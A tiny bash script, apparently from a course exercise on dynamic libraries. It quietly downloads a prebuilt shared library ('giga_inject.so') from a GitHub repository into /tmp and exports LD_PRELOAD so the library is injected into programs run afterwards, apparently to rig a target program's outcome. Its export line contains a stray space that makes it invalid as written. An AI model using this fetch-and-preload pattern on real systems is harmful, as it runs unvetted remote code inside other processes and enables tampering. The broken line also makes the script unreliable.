#!/bin/bash
wget -q -O /tmp/giga_inject.so https://github.com/chukxsemmy/alx-low_level_programming/raw/master/0x18-dynamic_libraries/giga_inject.so
export LD_PRELOAD =/tmp/giga_inject.so
